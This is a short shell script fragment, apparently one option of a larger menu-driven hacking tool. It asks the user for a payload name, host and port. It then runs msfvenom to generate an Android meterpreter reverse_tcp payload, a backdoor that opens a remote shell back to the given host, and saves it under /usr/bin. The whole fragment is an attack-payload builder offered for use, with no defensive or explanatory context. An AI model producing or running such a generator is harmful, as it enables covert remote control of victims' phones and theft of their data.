
read -p "Enter Payload name:" name
read -p "Enter the Host: " lhostt
read -p "Enter the Port: " lportt
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST = $lhostt LPORT = $lportt R > /usr/bin/$name
echo " Payload file stored in /usr/bin/"$name
break


